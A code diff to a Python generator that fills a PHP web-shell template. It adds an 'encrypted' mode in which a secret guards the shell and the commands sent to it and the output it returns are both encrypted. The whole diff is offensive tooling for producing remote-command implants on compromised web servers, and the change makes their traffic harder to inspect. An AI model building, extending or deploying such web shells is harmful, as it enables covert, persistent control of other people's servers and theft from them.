@@ -10,7 +10,7 @@ from shellsuite.protocol import contract
 
 from .spec import WebShellSpec
 
-from . import auth, drivers, readers
+from . import auth, crypto, drivers, readers
 
 _TEMPLATE = (
     importlib.resources.files("shellshock.creator") / "templates" / "webshell.php.tmpl"
@@ -34,15 +34,27 @@ def _context(spec: WebShellSpec) -> dict[str, str]:
 
     cmd_read = readers.read(spec.vector, "$__ss_cmd", contract.PARAM_NAMES[spec.vector])
 
+    crypto_helpers = ""
+    decrypt_block = ""
+    output_expr = "__ss_run($__ss_cmd)"
+
     if spec.mode == "plain":
         auth_block = "$__ss_ok = true;"
-    else:  # "auth" today; "encrypted" behaves the same until implemented
+    elif spec.mode == "auth":
         auth_block = auth.guard(spec.vector, auth.secret_hash(spec.secret))
+    else:  # "encrypted": auth is mandatory, and both directions are encrypted
+        auth_block = auth.guard(spec.vector, auth.secret_hash(spec.secret))
+        crypto_helpers = crypto.php_helpers()
+        decrypt_block = crypto.decrypt_block()
+        output_expr = crypto.encrypt_expr()
 
     return {
+        "crypto_helpers": crypto_helpers,
         "cmd_read": cmd_read,
         "driver_body": body,
         "auth_block": auth_block,
+        "decrypt_block": decrypt_block,
+        "output_expr": output_expr,
         "response_begin": contract.RESPONSE_BEGIN,
         "response_end": contract.RESPONSE_END,
     }
